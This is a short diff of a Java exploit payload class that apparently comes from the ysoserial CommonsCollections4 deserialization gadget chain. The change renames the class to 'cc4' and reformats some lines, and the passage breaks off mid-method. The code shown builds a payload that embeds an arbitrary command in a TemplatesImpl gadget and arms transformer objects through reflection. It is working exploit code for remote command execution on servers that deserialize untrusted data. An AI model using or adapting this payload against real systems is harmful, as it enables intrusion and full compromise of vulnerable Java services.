@@ -23,19 +23,17 @@ import java.util.Queue;
 
 @Dependencies({"org.apache.commons:commons-collections4:4.0"})
 @Authors({Authors.FROHOFF})
-public class CommonsCollections4 implements ObjectPayload<Queue<Object>> {
+public class cc4 implements ObjectPayload<Queue<Object>> {
 
     public Queue<Object> getObject(String command) throws Exception {
-        final Object templates;
-        templates = Gadgets.createTemplatesImpl(command);
+        final Object templates = Gadgets.createTemplatesImpl(command);
 
         ConstantTransformer constant = new ConstantTransformer(String.class);
 
         // mock method name until armed
         Class[]  paramTypes = new Class[]{String.class};
         Object[] args       = new Object[]{Utils.generateRandomString(4)};
-        InstantiateTransformer instantiate = new InstantiateTransformer(
-                paramTypes, args);
+        InstantiateTransformer instantiate = new InstantiateTransformer(paramTypes, args);
 
         // grab defensively copied arrays
         paramTypes = (Class[]) Reflections.getFieldValue(instantiate, "iParamTypes");
